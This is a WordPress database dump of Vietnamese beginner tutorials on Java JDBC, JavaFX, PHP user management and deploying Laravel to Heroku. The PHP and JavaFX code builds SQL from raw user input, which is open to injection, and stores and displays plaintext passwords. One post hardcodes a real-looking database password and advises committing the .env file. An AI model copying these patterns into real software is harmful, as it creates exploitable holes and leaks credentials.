(141, 1, '2019-11-09 11:37:50', '2019-11-09 11:37:50', '<img src=\"https://images.viblo.asia/31d58a8f-02d8-4078-ae8d-33385ef6193b.png\" alt=\"JDBC\" />\n\nKết nối vớiJDBC\n<pre>\npublic class Main {\n    public static void main(String[] args) {\n        try{\n            Class.forName(\"com.mysql.jdbc.Driver\");\n            String url = \"jdbc:mysql://localhost:3306/databasename?useUnicode=true&&characterEncoding=utf-8\";\n            String username = \"root\";\n            String password = \"\";\n            Connection conn = DriverManager.getConnection(url,username,password);\n\n            Statement stm = conn.createStatement();\n\n            String ins_sql = \"INSERT INTO student(student_name,age,mark) VALUES(\'Ngô Vên Duy\',18,2)\";\n            stm.executeUpdate(ins_sql);\n\n            String sql = \"SELECT * FROM student\";\n\n            ResultSet rs = stm.executeQuery(sql);\n            System.out.println(rs);\n\n            while (rs.next()){\n                System.out.println(rs.getInt(\"id\"));\n                System.out.println(rs.getString(\"student_name\"));\n                System.out.println(rs.getInt(\"age\"));\n                System.out.println(rs.getInt(\"mark\"));\n\n            }\n        }\n        catch (Exception e){\n            System.out.println(e.getMessage());\n        }\n    }\n}\n</pre>', 'JAVA - JDBC là gì', '', 'publish', 'open', 'open', '', 'jdbc-la-gi', '', '', '2019-11-09 11:37:50', '2019-11-09 11:37:50', '', 0, 'https://duycode.com/?p=141', 0, 'post', '', 0),
(143, 1, '2019-11-09 11:52:00', '2019-11-09 11:52:00', '<img src=\"https://d1jnx9ba8s6j9r.cloudfront.net/blog/wp-content/uploads/2018/01/2-2-768x685.png\" alt=\"\" />\n1. Hướng đối tượng: Class, Object, Interface\n2. Implement và Extend, Throws\n3. Class Frame\n- Datetime\n- Try .. catch\n- Collections.sort\n\n4. Java Application: Java Fx\n- File FXML: fx:controller =\"\"; fx:id =\"\", onAction=\"#\";\n- Stage, Scene\n- implements Initializable\n5. Java Input/Output\n6. Đa luồng: Thread, Runnable\n- wait(), notify()\n7. Connect Database:\n- JDBC', 'JAVA - Tổng quan', '', 'publish', 'open', 'open', '', 'java-tong-quan', '', '', '2019-11-09 11:52:00', '2019-11-09 11:52:00', '', 0, 'https://duycode.com/?p=143', 0, 'post', '', 0),
(145, 1, '2019-11-09 20:31:52', '2019-11-09 20:31:52', '<img src=\"https://lh5.googleusercontent.com/WqqNoyFEkZXfmZBBQjgIutY72_BUV6_By_BAe7Ih9u36HfelS3nTWQEYtdRUkQS32Tuhg9P9CUXo-jgvOpkO84vLm2viI4Od0BNustwONdMm7DKZnKC6kyVHyRJbsESLIPV4uBU\" alt=\"\" />', 'JAVA - Throwable - Exception - Error', '', 'publish', 'open', 'open', '', 'java-throwable-exception-error', '', '', '2019-11-09 20:31:52', '2019-11-09 20:31:52', '', 0, 'https://duycode.com/?p=145', 0, 'post', '', 0),
(147, 1, '2019-11-13 13:59:35', '2019-11-13 13:59:35', 'Main.class\n<img src=\"https://docs.oracle.com/javase/8/javafx/get-started-tutorial/img/login.png\" alt=\"\" />\n<pre>\npackage duycode;\n\nimport ...;\n\npublic class Main extends Application {\n    public static void main(String[] args) {\n        launch(args);\n    }\n    public static Stage mainStage;\n\n    @Override\n    public void start(Stage primaryStage) {\n        mainStage = primaryStage;\n        try{\n            Parent root = FXMLLoader.load(getClass().getResource(\"listperson.fxml\"));\n            Scene scene = new Scene(root,400,600);\n            primaryStage.setScene(scene);\n            primaryStage.setTitle(\"List Person\");\n            primaryStage.show();\n        }\n        catch (Exception e){\n            System.out.println(e.getMessage());\n        }\n    }\n}\n</pre>\n\nConnectMySQL.class\n<pre>\npackage duycode;\n\nimport ...;\n\npublic class ConnectMySQL {\n    public static Connection ConnectMySQL() throws Exception{\n        Class.forName(\"com.mysql.jdbc.Driver\");\n        String url = \"jdbc:mysql://localhost:3306/duycode?useUnicode=true&characterEncoding=utf-8\";\n        String username = \"root\";\n        String password = \"\";\n        return DriverManager.getConnection(url,username,password);\n    }\n}\n</pre>\n\nlistperson.fxml\n<pre>\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\n<?import javafx.scene.text.*?>\n<?import javafx.scene.control.*?>\n<?import javafx.scene.layout.*?>\n\n<Pane fx:controller=\"duycode.ListStudents\" maxHeight=\"-Infinity\" maxWidth=\"-Infinity\" minHeight=\"-Infinity\" minWidth=\"-Infinity\" prefHeight=\"613.0\" prefWidth=\"600.0\" xmlns=\"http://javafx.com/javafx/8\" xmlns:fx=\"http://javafx.com/fxml/1\">\n   <children>\n       <Text layoutX=\"210.0\" layoutY=\"57.0\" strokeType=\"OUTSIDE\" strokeWidth=\"0.0\" text=\"List Students\">\n           <font>\n                <Font size=\"32.0\" />\n           </font>\n       </Text>\n       <TextField fx:id=\"searchName\" layoutX=\"315.0\" layoutY=\"100.0\" onAction=\"#searchname\" prefHeight=\"31.0\" prefWidth=\"265.0\" promptText=\"Search name\" />\n       <TableView fx:id=\"tbView\" layoutX=\"20.0\" layoutY=\"143.0\" prefHeight=\"374.0\" prefWidth=\"560.0\">\n           <columns>\n                <TableColumn fx:id=\"colID\" prefWidth=\"67.0\" text=\"ID\" />\n                <TableColumn fx:id=\"colName\" prefWidth=\"228.0\" text=\"Name\" />\n                <TableColumn fx:id=\"colAge\" prefWidth=\"118.0\" text=\"Age\" />\n                <TableColumn fx:id=\"colMark\" prefWidth=\"145.0\" text=\"Mark\" />\n           </columns>\n       </TableView>\n      <Button onAction=\"#addStudent\" layoutX=\"400.0\" layoutY=\"541.0\" mnemonicParsing=\"false\" prefHeight=\"31.0\" prefWidth=\"180.0\" text=\"Add Student\" />\n      <Button onAction=\"#deleteStudent\" layoutX=\"20.0\" layoutY=\"541.0\" mnemonicParsing=\"false\" text=\"Delete\" />\n   </children>\n</Pane>\n</pre>\n\n\nListStudent.class\n<pre>\npackage duycode;\n\nimport ...;\n\npublic class ListStudents implements Initializable {\n    public TableView<Student> tbView = new TableView<>();\n    public TableColumn<Student,Integer> colID = new TableColumn<>();\n    public TableColumn<Student,String> colName = new TableColumn<>();\n    public TableColumn<Student,Integer> colAge = new TableColumn<>();\n    public TableColumn<Student,Double> colMark = new TableColumn<>();\n    public TextField searchName = new TextField();\n\n\n    @Override\n    public void initialize(URL location, ResourceBundle resources) {\n        colID.setCellValueFactory(new PropertyValueFactory<>(\"id\"));\n        colName.setCellValueFactory(new PropertyValueFactory<>(\"name\"));\n        colAge.setCellValueFactory(new PropertyValueFactory<>(\"age\"));\n        colMark.setCellValueFactory(new PropertyValueFactory<>(\"mark\"));\n\n        String queryData = \"SELECT * FROM liststudent\";\n        selectquery(queryData);\n    }\n\n    public void selectquery(String queryData){\n        ObservableList<Student> list1 = FXCollections.observableArrayList();\n        try{\n            Connection conn = ConnectMySQL.ConnectMySQL();\n            Statement stm = conn.createStatement();\n            ResultSet resultData = stm.executeQuery(queryData);\n\n            while (resultData.next()){\n                list1.add(new Student(\n                        resultData.getInt(\"id\"),\n                        resultData.getString(\"student_name\"),\n                        resultData.getInt(\"age\"),\n                        resultData.getDouble(\"mark\"))\n                );\n            }\n            conn.close();\n        }\n        catch (Exception e){\n            System.out.println(e.getMessage());\n        }\n        tbView.setItems(list1);\n    }\n\n    public void searchname(){\n        String txtSearch = searchName.getText();\n        String queryData = \"SELECT * FROM liststudent WHERE student_name LIKE \'%\"+txtSearch+\"%\'\";\n        selectquery(queryData);\n    }\n\n    public void deleteStudent(){\n        int deleteID = tbView.getSelectionModel().getSelectedItems().get(0).getId();\n        String deleteSelect = \"DELETE FROM liststudent WHERE id=\"+deleteID;\n        confirmdelete(deleteSelect);\n    }\n\n    public void confirmdelete(String deleteSelect){\n        Pane confirm = new Pane();\n        confirm.setPadding(new Insets(20,200,0,10));\n        Text textconfirm = new Text(150,50,\"Are you sure ?\");\n        Font fontcf = new Font(\"Arial\",20);\n        textconfirm.setFont(fontcf);\n        Button button1 = new Button(\"Yes\");\n        button1.setLayoutX(75);\n        button1.setLayoutY(100);\n        button1.setPrefSize(100,25);\n        Button button2 = new Button(\"No\");\n        button2.setLayoutX(225);\n        button2.setLayoutY(100);\n        button2.setPrefSize(100,25);\n        confirm.getChildren().addAll(textconfirm,button1,button2);\n        Scene scenecofirm = new Scene(confirm, 400,200);\n        Stage stageconfirm = new Stage();\n        stageconfirm.setTitle(\"Yes or No\");\n        stageconfirm.setScene(scenecofirm);\n        stageconfirm.show();\n        button1.setOnAction(new EventHandler<ActionEvent>() {\n            @Override\n            public void handle(ActionEvent event) {\n                try{\n                    Connection conn = ConnectMySQL.ConnectMySQL();\n                    Statement stm = conn.createStatement();\n                    stm.executeUpdate(deleteSelect);\n                    conn.close();\n                }\n                catch (Exception e){\n                    System.out.println(e.getMessage());\n                }\n                String queryData = \"SELECT * FROM liststudent\";\n                selectquery(queryData);\n                stageconfirm.close();\n            }\n        });\n        button2.setOnAction(new EventHandler<ActionEvent>() {\n            @Override\n            public void handle(ActionEvent event) {\n                stageconfirm.close();\n            }\n        });\n    }\n\n    public void addStudent(){\n        try{\n            Parent addStudent = FXMLLoader.load(getClass().getResource(\"addstudent.fxml\"));\n            Main.mainStage.getScene().setRoot(addStudent);\n            Main.mainStage.setTitle(\"Add student\");\n        }\n        catch (Exception e){\n            System.out.println(e.getMessage());\n        }\n\n    }\n}\n</pre>\n\n\n\n', 'JAVA Application -JavaFX', '', 'publish', 'open', 'open', '', 'java-application-javafx', '', '', '2019-11-13 13:59:35', '2019-11-13 13:59:35', '', 0, 'https://duycode.com/?p=147', 0, 'post', '', 0),
(162, 1, '2019-11-26 12:14:50', '2019-11-26 12:14:50', '<img src=\"http://giasutinhoc.vn/wp-content/uploads/2016/02/doc-va-ghi-file-trong-java-1.jpg\" alt=\"Luồng đọc ghi\" />\n<img src=\"http://giasutinhoc.vn/wp-content/uploads/2016/02/doc-va-ghi-file-trong-java-3.jpg\" alt=\"Input và Reader\" />\n<img src=\"http://giasutinhoc.vn/wp-content/uploads/2016/02/doc-va-ghi-file-trong-java-4.jpg\" alt=\"Output và Write\" />\n\n<pre>\npackage Test;\n\nimport java.io.*;\n\npublic class Main{\n    public static void main(String[] args) {\n        File f = new File(\"C:\\\\Users\\\\Duy\\\\Desktop\\\\liststudent.txt\");\n        String ftxt = \"Student ID, Student Name, Address, Phone \\n\";\n        if (f.canWrite()) {\n            try {\n                FileOutputStream fos = new FileOutputStream(f);\n                DataOutputStream dos = new DataOutputStream(fos);\n                for (Student st : arrayList) {\n                    String s = st.getStudentID() + \",\" + st.getStudentName() + \",\" + st.getAddress() + \",\" + st.getPhone() + \" \\n\";\n                    ftxt = ftxt + s;\n                }\n                dos.writeBytes(ftxt);\n                dos.close();\n                fos.close();\n            } catch (FileNotFoundException e) {\n                e.printStackTrace();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if (f.canRead()) {\n            try {\n                FileInputStream fis = new FileInputStream(f);\n                DataInputStream dis = new DataInputStream(fis);\n                String line = \"\";\n                while ((line = dis.readLine()) != null) {\n                    ftxt += line + \"\\n\";\n                    String[] strs = line.split(\"-\");\n                    Student s = new Student(strs[0], Integer.parseInt(strs[1]),\n                            Integer.parseInt(strs[2]));\n                    arr.add(s);\n                }\n                dis.close();\n                fis.close();\n            } catch (FileNotFoundException e) {\n                e.printStackTrace();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n</pre>\n        ', 'JAVA - Input / Output', '', 'publish', 'open', 'open', '', 'java-input-output', '', '', '2019-11-26 12:14:50', '2019-11-26 12:14:50', '', 0, 'https://duycode.com/?p=162', 0, 'post', '', 0),
(187, 1, '2020-02-26 15:10:29', '2020-02-26 15:10:29', 'Các phần mềm cần thiết khi học PHP\n<img src=\"https://quachquynh.com/wp-content/uploads/2019/11/lap-trinh-php-1.jpg\" alt=\"\" />\n<h3>I. XAMPP:</h3>\n- Download: <a href=\"https://www.apachefriends.org/index.html\" rel=\"noopener noreferrer\" target=\"_blank\">https://www.apachefriends.org/index.html</a>\nKhi cài đặt XAMPP xuất hiện lỗi: Thường bị chiếm cổng Port 80, có thể xem phần mềm nào đang chiếm cổng 80: \n- Dùng cmd\n<blockquote>netstat -ano</blockquote>\n- Vào:Task Manager->Details Tìm phần mềm có PID tương ứng\n- Chuyển cổng mặc định của XAMPP là 80 sang 81:\n- Vào XAMPP -> Config(Apache) -> Apache(httpd.conf) -> Search và chuyển hết 80 thành 81\n- Vào XAMPP -> Config(Apache) -> Apache(httpd-ssl.conf) -> Search và chuyển hết 443 thành 4433\n\n<h3>II. Composer:</h3>\n- Link: <a href=\"https://getcomposer.org/download/\" rel=\"noopener noreferrer\" target=\"_blank\">https://getcomposer.org/download/</a>\n- Trong quá trình cài đặt: khi cần trỏ vào php thì trỏ vào: ...\\Xampp\\php\\php.exe\n\n<h3>III. Cài đặt Laravel</h3>\n<h4>1. Cài đặt</h4>\n- Hướng dẫn cài: <a href=\"https://laravel.com/docs/5.8/installation\" rel=\"noopener noreferrer\" target=\"_blank\">https://laravel.com/docs/5.8/installation</a>\n- Cài đặt full: Dùng Command Prompt gõ lệnh:\n<pre>\n//trỏ vào thư mục htdocs\ncd C:/Xampp/htdocs\n\n//tạo project laravel, với yourfolders là thư mục bạn muốn cài\ncomposer create-project --prefer-dist laravel/laravel yourfolders \"5.8.*\"\n</pre>\n\n<h4>2. Một số lệnh thường dùng</h4>\n<pre>\n//Create file Controller:\nphp artisan make:controller WebController\n\n//Create file Model\nphp artisan make:model Category\n\n//Create Migration:\n//create_category: là tạo class CreateCategory\n//create=category: là tạo bảng tên category\nphp artisan make:migration create_product --create=product\n\n//run Migration\nphp artisan migrate\n//xóa các bảng đã tạo\nphp artisan migrate:fresh\n\n//Create Seed\nphp artisan make:seeder CategorySeeder\n//run Seed\nphp artisan db:seed\n\n//refresh Seed\nphp artisan migrate:refresh --seed\n\n//Refresh Cache\nphp artisan config:cache\n</pre>\n\n<h4>3. Connect Heroku và Github</h4>\n- Login Github trên Heroku và để Automatic deploys\n- Tại thư mục gốc Project Laravel, tạo 1 file: Procfile (ko có đuôi mở rộng) với nội dung:\n<pre>web: vendor/bin/heroku-php-apache2 public/</pre>\n- Tại .gitignore -> bỏ dòng \".env\"\n- Deploys lần đầu tại Heroku và xem kết quả :D', 'Laravel - Cài đặt và sử dụng', '', 'publish', 'open', 'open', '', 'laravel-cai-dat-va-su-dung', '', '', '2020-02-26 15:10:29', '2020-02-26 15:10:29', '', 0, 'https://duycode.com/?p=187', 0, 'post', '', 0),
(200, 1, '2020-03-08 06:28:44', '2020-03-08 06:28:44', '<h2>1. Tạo model kết nối database</h2>\n-- Tạo file: model/connection.php\n<pre>\n<?php\n//server info\n$serverName = \"localhost\";\n$serverUser = \"root\";\n$serverPassword = \"\";\n$database = \"phongkhamdemo\";\n\n//connect database\n$conn = new mysqli($serverName,$serverUser,$serverPassword,$database);\n\n//check connection\nif($conn->connect_error){\n    die(\"Connection failed\");\n}\n?>\n</pre>\n\n<h2>2. Hiển thị danh sách User</h2>\n-- Tạo file: view/admin/user_list.php\n<pre>\n<!DOCTYPE html>\n<html>\n\n<head>\n    <title>User Management</title>\n</head>\n\n<body>\n    <table border=\"1\" style=\"border-collapse: collapse;\">\n        <thead>\n            <tr>\n                <th>ID</th>\n                <th>Username</th>\n                <th>Password</th>\n                <th>Email</th>\n                <th>Phone</th>\n                <th>Address</th>\n                <th>Permission</th>\n                <th>Action</th>\n            </tr>\n        </thead>\n        <tbody>\n            <?php\n            require_once(\"../../model/connection.php\");\n            $sql = \"SELECT * FROM users\";\n            $result = $conn->query($sql);\n            if ($result->num_rows > 0) {\n                while ($user = $result->fetch_assoc()) {\n            ?>\n                    <tr>\n                        <th><?php echo $user[\"userID\"] ?></th>\n                        <td><?php echo $user[\"username\"] ?></td>\n                        <td><?php echo $user[\"password\"] ?></td>\n                        <td><?php echo $user[\"email\"] ?></td>\n                        <td><?php echo $user[\"phone\"] ?></td>\n                        <td><?php echo $user[\"address\"] ?></td>\n                        <td><?php echo $user[\"permission\"] ?></td>\n                        <td>\n                            <a href=\"user_edit.php?id=<?php echo $user[\"userID\"] ?>\">Sửa</a>\n                            <a href=\"user_delete.php?id=<?php echo $user[\"userID\"] ?>\">Xóa</a>\n                        </td>\n                    </tr>\n            <?php\n                }\n            }\n            ?>\n        </tbody>\n    </table>\n    <a href=\"user_add.php\"><button>Add User</button></a>\n\n</body>\n\n</html>\n</pre>\n\n<h2>3. Thêm User</h2>\n-- Tạo file: view/admin/user_add.php\n<pre>\n<!DOCTYPE html>\n<html>\n\n<head>\n    <title>Add User</title>\n</head>\n\n<body>\n    <?php\n    require_once(\"../../model/connection.php\");\n    if (isset($_POST[\"save\"])) {\n        $username = $_POST[\"username\"];\n        $password = $_POST[\"password\"];\n        $email = $_POST[\"email\"];\n        $phone = $_POST[\"phone\"];\n        $address = $_POST[\"address\"];\n        $permission = $_POST[\"permission\"];\n        $sql = \"INSERT INTO users (username,password,email,phone,address,permission) \n                VALUES (\'$username\',\'$password\',\'$email\',\'$phone\',\'$address\',\'$permission\')\";\n        if ($conn->query($sql) === TRUE) {\n            header(\'Location: user_list.php\');\n        } else {\n            echo \"Error updating record: \" . $conn->error;\n        }\n    }\n    $conn->close();\n    ?>\n\n    <form method=\"POST\">\n        <label for=\"username\">Username:</label><br>\n        <input type=\"text\" name=\"username\"><br>\n\n        <label for=\"password\">Password:</label><br>\n        <input type=\"password\" name=\"password\"><br>\n\n        <label for=\"email\">Email:</label><br>\n        <input type=\"text\" name=\"email\"><br>\n\n        <label for=\"phone\">Phone:</label><br>\n        <input type=\"text\" name=\"phone\"><br>\n\n        <label for=\"address\">Address:</label><br>\n        <input type=\"text\" name=\"address\"><br>\n\n        <label for=\"permission\">Permission:</label><br>\n        <select name=\"permission\" required>\n            <option selected disabled hidden>Please select permission</option>\n            <option value=\"1\">Administrator</option>\n            <option value=\"2\">Free User</option>\n            <option value=\"3\">Basic User</option>\n            <option value=\"4\">VIP User</option>\n        </select><br>\n\n        <input type=\"submit\" name=\"save\" value=\"Submit\" ><br>\n    </form>\n\n</body>\n\n</html>\n</pre>\n\n<h2>4. Sửa User</h1>\n-- Tạo file: view/admin/user_edit.php\n<pre>\n<!DOCTYPE html>\n<html>\n\n<head>\n    <title>Edit User</title>\n</head>\n\n<body>\n    <?php\n    require_once(\"../../model/connection.php\");\n    $id = \"\";\n    $username = \"\";\n    $password = \"\";\n    $email = \"\";\n    $phone = \"\";\n    $address = \"\";\n    $permission = \"\";\n    if (isset($_GET[\"id\"])) {\n        $id = $_GET[\"id\"];\n        $sql = \"SELECT * FROM users WHERE userID = $id\";\n        $result = $conn->query($sql);\n        if ($result->num_rows > 0) {\n            while ($user = $result->fetch_assoc()) {\n                $id = $user[\"userID\"];\n                $username =  $user[\"username\"];\n                $password =  $user[\"password\"];\n                $email =  $user[\"email\"];\n                $phone = $user[\"phone\"];\n                $address = $user[\"address\"];\n                $permission = $user[\"permission\"];\n            }\n        }\n    }\n    if (isset($_POST[\"save\"])) {\n        $username = $_POST[\"username\"];\n        $password = $_POST[\"password\"];\n        $email = $_POST[\"email\"];\n        $phone = $_POST[\"phone\"];\n        $address = $_POST[\"address\"];\n        $permission = $_POST[\"permission\"];\n        $sql = \"UPDATE users \n                SET username=\'$username\',password=\'$password\',email=\'$email\',\n                    phone=\'$phone\',address=\'$address\',permission=\'$permission\' \n                WHERE userID=\'$id\'\";\n        if ($conn->query($sql) === TRUE) {\n            header(\'Location: user_list.php\');\n        } else {\n            echo \"Error updating record: \" . $conn->error;\n        }\n    }\n    $conn->close();\n    ?>\n    <form method=\"POST\">\n        <label for=\"username\">Username:</label><br>\n        <input type=\"text\" name=\"username\" value=\"<?php echo $username; ?>\"><br>\n\n        <label for=\"password\">Password:</label><br>\n        <input type=\"password\" name=\"password\" value=\"<?php echo $password; ?>\"><br>\n\n        <label for=\"email\">Email:</label><br>\n        <input type=\"text\" name=\"email\" value=\"<?php echo $email; ?>\"><br>\n\n        <label for=\"phone\">Phone:</label><br>\n        <input type=\"text\" name=\"phone\" value=\"<?php echo $phone; ?>\"><br>\n\n        <label for=\"address\">Address:</label><br>\n        <input type=\"text\" name=\"address\" value=\"<?php echo $address; ?>\"><br>\n\n        <label for=\"permission\">Permission:</label><br>\n        <select name=\"permission\" required>\n            <option selected disabled hidden>Please select permission</option>\n            <option value=\"1\" <?php echo ($permission == 1) ? \"selected\" : \"\"; ?>>Administrator</option>\n            <option value=\"2\" <?php echo ($permission == 2) ? \"selected\" : \"\"; ?>>Free User</option>\n            <option value=\"3\" <?php echo ($permission == 3) ? \"selected\" : \"\"; ?>>Basic User</option>\n            <option value=\"4\" <?php echo ($permission == 4) ? \"selected\" : \"\"; ?>>VIP User</option>\n        </select><br>\n        <input type=\"submit\" value=\"Submit\" name=\"save\"><br>\n    </form>\n\n</body>\n\n</html>\n</pre>\n\n<h2>5. Xóa User</h2>\n-- Tạo file: view/admin/user_delete.php\n<pre>\n<?php\nrequire_once(\"../../model/connection.php\");\nif (isset($_GET[\"id\"])) {\n    $id = $_GET[\"id\"];\n    $sql = \"DELETE FROM users WHERE userID = $id\";\n    if ($conn->query($sql) === TRUE) {\n        header(\'Location: user_list.php\');\n    } else {\n        echo \"Error: \" . $conn->error;\n    }\n}\n</pre>', 'PHP - Hiển thị danh sách User, thêm, sửa, xóa User bằng PHP', '', 'publish', 'open', 'open', '', 'php-hien-thi-danh-sach-user-them-sua-xoa-user-bang-php', '', '', '2020-03-08 06:28:44', '2020-03-08 06:28:44', '', 0, 'https://duycode.com/?p=200', 0, 'post', '', 0),
(205, 1, '2020-03-08 07:40:54', '2020-03-08 07:40:54', '<img src=\"https://i.stack.imgur.com/4qglC.png\" alt=\"MVC\" />\n<h2>1. Route</h2>\n<pre>\n<?php\n// Sửa trong file Routes/web.php\n// Cấu trúc Route::METHOD(path_string,HANDLE_FUNCTION);\n// Giả sử Link vào trang -- http://localhost/t1904a_laravel/public/xin-chao -- như sau\n\nRoute::get(\"/xin-chao\",function(){\n    echo \"Chào tất cả mọi người\";\n});\n\n// Thực tế việc của Route là điều hướng đến Controller\n// Ở dưới thể hiện điều hướng đến Controller, cụ thể là hàm \"classRoom\" trong WebController tại thư mục app/Http/Controller\nRoute::get(\"/danh-sach-lop-hoc\",\"WebController@classRoom\");\n\n// Ở dưới thể hiện điều hướng đến Controller, cụ thể là hàm \"listing\" trong WebController tại thư mục app/Http/Controller, và có nhận thêm biến {id} ở listing.\nRoute::get(\"/danh-muc/{id}\",\"WebController@listing\");\n//\n</pre>\n\n<h2>2. Controller</h2>\n- Tạo file WebController trong thư mục app/Http/Controller bằng Terminal\n<pre>php artisan make:controller WebController</pre>\n\n- Thêm dữ liệu cho Controller\n<pre>\n<?php\nnamespace App\\Http\\Controllers;\nuse Illuminate\\Http\\Request;\n\nclass WebController extends Controller\n{\n    //tạo dữ liệu để thử\n    public function classRoom(){\n        $students = [\n            [\n                \"id\" => 1,\n                \"name\"=> \"Nguyễn Thị Ninh\",\n                \"email\"=> \"ninhntth@gmail.com\",\n                \"mark\"=>9\n            ],\n            [\n                \"id\" => 2,\n                \"name\"=> \"Nguyễn Thế Anh\",\n                \"email\"=> \"theanh@gmail.com\",\n                \"mark\"=>3\n            ],\n            [\n                \"id\" => 3,\n                \"name\"=> \"Nguyễn Thị Nụ\",\n                \"email\"=> \"nuhongmmongmanh@gmail.com\",\n                \"mark\"=>7\n            ],\n        ];\n        return view(\"student_listing\",[\'students\'=>$students]);\n        // Ở trên thể hiện điều hướng đến resoures/views/student_listing.blade.php\n        // Và bắn thêm biến students sang bên đó\n    }\n\n    //lấy thêm biến $id\n    public function listing($id){\n        $products = Product::where(\"category_id\",$id)->take(20)->orderBy(\'created_at\',\'desc\')->get();\n        return view(\"listing\",[\'products\'=>$products]);\n}\n</pre>\n\n<h2>3. View</h2>\n- Tại resoures/views/... tạo 1 file student_listing.blade.php với nội dung như sau\n<pre>\n\n<!doctype html>\n<html lang=\"en\">\n<head>\n    <link rel=\"stylesheet\" href={{asset(\"css/style.css\")}}>\n</head>\n\n<header>\n    <ul class=\"nav nav-tabs\">\n        <li class=\"nav-item\"><a class=\"nav-link active\" href=\"{{url(\"/\")}}\">Home</a></li>\n        @foreach(\\App\\Category::all() as $c)\n            <li class=\"nav-item\"><a class=\"nav-link\" href=\"{{url(\"danh-muc/{$c->id}\")}}\">{{$c->category_name}}</a></li>\n        @endforeach\n    </ul>\n</header>\n\n<body>\n<main>\n<h1>Danh sách sinh viên</h1>\n\n<table class=\"table\">\n    <thead>\n        <th>ID</th>\n        <th>Name</th>\n        <th>Email</th>\n        <th>Mark</th>\n    </thead>\n    <tbody>\n            <?php foreach ($students as $s):?>\n            <tr>\n                <td><?php echo $s[\'id\'];?></td>\n                <td><?php echo $s[\'name\'];?></td>\n                <td><?php echo $s[\'email\'];?></td>\n                <td><?php echo $s[\'mark\'];?></td>\n            </tr>\n            <?php endforeach; ?>\n    </tbody>\n</table>\n</main>\n</body>\n</html>\n\n//Bây giờ có thể vào http://localhost/t1904a_laravel/public/danh-sach-lop-hoc để xem kết quả\n</pre>', 'Laravel - Mô hình MVC', '', 'publish', 'open', 'open', '', 'laravel-mo-hinh-mvc', '', '', '2020-03-08 07:40:54', '2020-03-08 07:40:54', '', 0, 'https://duycode.com/?p=205', 0, 'post', '', 0),
(213, 1, '2020-03-08 09:34:04', '2020-03-08 09:34:04', '<img src=\"https://1.bp.blogspot.com/-mXa5WEt9uB4/WzPHV7c5bZI/AAAAAAAAEr0/1UekiyCF2JQU46vPMhfiaAUFeb2ib3yXACLcBGAs/s1600/BladeTemplates.png\" alt=\"Blade template\" />\n\n- Tại resoures/views/... có 1 file layout.blade.php với nội dung như sau\n<pre>\n\n<!doctype html>\n<html lang=\"en\">\n<head>\n    <title>Test Layout</title>\n</head>\n<body>\n<header>Rất nhiều code của Header ở đây</header>\n<main>\n    <div>\n        @yield(\'content\')\n    </div>\n</main>\n<footer>Rất nhiều code của Footer ở đây</footer>\n</body>\n</html>\n</pre>\n\n\n- Vẫn tại resoures/views/...Các trang khác như /danh-muc, /san-pham, /don-hang muốn thừa kế phần trên mà ko phải viết lại code đoạn header, footer\n<pre>\n@extends(\'layout\')\n\n@section(\'content\')\n    <h1>Đây là phần viết thêm code</h1>\n@endsection\n</pre>\n', 'Laravel - Blade Template', '', 'publish', 'open', 'open', '', 'laravel-blade-template', '', '', '2020-03-08 09:34:04', '2020-03-08 09:34:04', '', 0, 'https://duycode.com/?p=213', 0, 'post', '', 0),
(215, 1, '2020-03-08 10:54:27', '2020-03-08 10:54:27', '<img src=\"https://miro.medium.com/max/1200/1*kg8aAUNxI055OhNhT04srQ.png\" alt=\"Heroku\" />\n<h2>1. Github</h2>\n- Tạo Project trên Github như bình thường\n\n<h2>2. Heroku</h2>\n- Connect Heroku và Github\n- Login Github trên Heroku và để Automatic deploys\n- Tại Project, tạo 1 file: Procfile (ko có đuôi mở rộng) ở thư mục gốc với nội dung\n<pre>web: vendor/bin/heroku-php-apache2 public/</pre>\n- Tại .gitignore -> bỏ dòng \".env\"\n- Deploys lần đầu tại Heroku và xem kết quả :D\n\n<h2>3. PostgreSQL</h2>\n- Trên Heroku -> Data -> install PostgreSQL\n- Lấy thông tin Host, Port, Username, Password trong mục Setting của PostgreSQL\n- Vào /config/database.php: sửa phần  \'pgsql\' tương tự như sau:\n<pre>\n//khu vực sửa default\n\'default\' => \'pgsql\', // env(\'DB_CONNECTION\', \'mysql\'),\n\n//khu vực sửa pgsql\n\'pgsql\' => [\n    \'driver\' => \'pgsql\',\n    //\'url\' => env(\'DATABASE_URL\'),\n    \'host\' => \"ec2-3-234-169-147.compute-1.amazonaws.com\",  //env(\'DB_HOST\', \'127.0.0.1\'),\n    \'port\' => 5432, //env(\'DB_PORT\', \'5432\'),\n    \'database\' => \"dap7l49crge5kq\",   //env(\'DB_DATABASE\', \'forge\'),\n    \'username\' => \"vqizhousadiyop\",   // env(\'DB_USERNAME\', \'forge\'),\n    \'password\' => \"4859eae57eeceb42b2fe942471234934e004855aa74c00cf77317068223524b2\",   //env(\'DB_PASSWORD\', \'\'),\n    \'charset\' => \'utf8\',\n    \'prefix\' => \'\',\n    \'prefix_indexes\' => true,\n    \'schema\' => \'public\',\n    \'sslmode\' => \'prefer\',\n],\n</pre>\n\n- Trên Heroku -> Console\n<pre>\nphp artisan migrate\n</pre>\n\n- Khi đảo Database quá nhiều, rất dễ tình trạng bị mất kết nối, để chỉnh lại\n<pre>\nphp artisan config:cache\n</pre>', 'Laravel - Lưu trữ Project với Github, Heroku, PostgreSQL', '', 'publish', 'open', 'open', '', 'laravel-luu-tru-project-voi-github-heroku-postgresql', '', '', '2020-03-08 10:54:27', '2020-03-08 10:54:27', '', 0, 'https://duycode.com/?p=215', 0, 'post', '', 0),
